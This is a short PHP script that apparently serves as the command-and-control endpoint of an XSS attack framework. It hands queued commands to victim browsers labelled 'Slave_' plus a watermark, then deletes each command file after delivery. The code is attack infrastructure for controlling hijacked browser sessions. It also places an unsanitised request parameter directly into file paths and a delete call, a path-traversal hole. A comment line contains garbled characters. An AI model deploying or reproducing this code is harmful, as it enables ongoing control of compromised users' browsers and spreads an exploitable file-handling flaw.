<?php
//$cmd = getenv('QUERY_STRING');  // XSS���ص�����
//header('Content-Type: application/javascript');
$watermarknum = "Slave_".$_GET['watermark'];

if ($watermarknum == "null"){
	$watermarknum = "Slave_noWatermark";
}

if (file_exists("../slave/".$watermarknum."_rtcmd.txt")){
    $cmd = file_get_contents("../slave/".$watermarknum."_rtcmd.txt"); 
    unlink("../slave/".$watermarknum."_rtcmd.txt");
    
    echo $cmd;
} else {
	  echo "";
}

?>
